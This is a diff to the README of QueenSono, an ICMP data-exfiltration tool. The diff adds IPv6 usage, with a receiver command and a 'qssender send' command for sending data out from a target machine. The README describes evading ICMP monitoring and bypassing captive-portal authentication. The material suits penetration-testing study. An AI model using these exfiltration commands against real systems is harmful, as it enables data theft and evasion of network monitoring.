@@ -2,7 +2,7 @@
 
 <p align="center"><img src=https://github.com/ariary/QueenSono/blob/main/img/qs-small.png>
 <br><br><a href="https://github.com/enaqx/awesome-pentest"><img src="https://awesome.re/mentioned-badge.svg"></a></p>
-<h4 align="center">A Golang Package for Data Exfiltration with ICMP protocol.</h4>
+<h4 align="center">A Golang Package for Data Exfiltration with ICMP protocol (IPv4 & IPv6).</h4>
 
 <p align="center">
   QueenSono tool only relies on the fact that ICMP protocol isn't monitored. It is quite common. It could also been used within a system with basic ICMP inspection (ie. frequency and content length watcher) or to bypass authentication step with captive portal (used by many public Wi-Fi to authenticate users after connecting to the Wi-Fi e.g Airport Wi-Fi). Try to imitate <a href="https://github.com/ytisf/PyExfil">PyExfil</a> (and others) with the idea that the target machine does not necessary have python installed (so provide a binary could be useful)
@@ -67,6 +67,7 @@ make before.build
  To build the ICMP packet receiver `qsreceiver` :
 
      build.queensono-receiver
+
 ## Usage
 
 `qssender` is the binary which will send ICMP packet  to the listener , so it is the binary you have to transfer on your target machine. 
@@ -232,6 +233,31 @@ On target machine:
 </details>
 
 
+### IPv6 support
+
+QueenSono supports ICMPv6 transparently. Pass an IPv6 address and the protocol is auto-detected — no extra flags needed.
+
+On local machine:
+
+    $ qsreceiver receive -l ::
+
+On target machine:
+
+    $ qssender send "hello from ipv6" -d 2 -l :: -r fe80::1 -s 50000
+
+<details>
+  <summary><b>Explanation</b></summary>
+    <li>
+    <code>-l ::</code> listen on all IPv6 interfaces
+    </li>
+    <li>
+      <code>-r fe80::1</code> IPv6 address of the remote machine — triggers ICMPv6 automatically
+    </li>
+
+</details>
+
+All modes (send with ACK, send without ACK, encrypted, echo reply) work the same way over IPv6.
+
 ### Bonus
 
 See [hack](https://github.com/ariary/QueenSono/tree/main/hack) section for fun things with `QueenSono`:
@@ -239,6 +265,7 @@ See [hack](https://github.com/ariary/QueenSono/tree/main/hack) section for fun t
 * HTTP over ICMP tunneling
 
 ### Notes
-- only work on Linux  (due to the use of golang net icmp package)
-- need `cap_net_raw` capabilities
+- only works on Linux (due to the use of golang net icmp package)
+- needs `cap_net_raw` capabilities
+- supports both IPv4 (ICMP) and IPv6 (ICMPv6) — auto-detected from the address
 - if you actually send ICMP packets on 2 different machines and you wait for echo reply, be sure to use a reachable IP by remote as a listening address (do not use localhost or equivalent)
